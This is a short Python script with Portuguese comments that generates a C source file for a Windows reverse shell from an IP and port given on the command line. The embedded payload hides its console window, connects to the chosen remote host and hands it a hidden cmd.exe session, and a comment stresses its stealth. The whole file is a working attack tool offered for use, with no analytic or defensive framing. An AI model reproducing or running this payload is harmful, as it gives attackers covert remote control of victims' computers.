# feito por M1000 - github.com/curious0w
import sys
import os
import subprocess


def gerar_reverse_shell(ip_destino, porta_destino):
    # template com placeholders {IP} e {PORT}
    template = """\
// Payload reverso (Windows) - template
// Altere HOST e PORT conforme necessário
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib")

int main() {
    HWND stealth = GetConsoleWindow();
    ShowWindow(stealth, SW_HIDE);

    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    struct hostent *host; // Estrutura para o DNS

    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) return 1;

    // 1. Resolve o domínio para IP
    host = gethostbyname("{IP}");
    if (host == NULL) {
        WSACleanup();
        return 1;
    }

    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET) return 1;

    server.sin_family = AF_INET;
    server.sin_port = htons({PORT});
    // 2. Copia o IP resolvido para a estrutura do servidor
    server.sin_addr.s_addr = *((unsigned long *)host->h_addr);

    if (WSAConnect(s, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL) != SOCKET_ERROR) {
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        
        si.cb = sizeof(si);
        si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
        si.wShowWindow = SW_HIDE;

        // CREATE_NO_WINDOW garante discrição total
        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        
        WaitForSingleObject(pi.hProcess, INFINITE);
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    closesocket(s);
    WSACleanup();
    return 0;
}
"""
    content = template.replace("{IP}", ip_destino).replace("{PORT}", str(porta_destino))
    nome_arquivo_saida = f"payload.c"

    try:
        with open(nome_arquivo_saida, 'w', encoding='utf-8') as f:
            f.write(content)
        print(f"Arquivo gerado: {nome_arquivo_saida}")

  

    except Exception as e:
        print(f"ERRO: Não foi possível escrever o arquivo final: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Uso: python escopos/C/escopo_c.py <IP> <PORTA>")
        sys.exit(1)
    ip_final = sys.argv[1]
    porta_final = sys.argv[2]
    gerar_reverse_shell(ip_final, porta_final)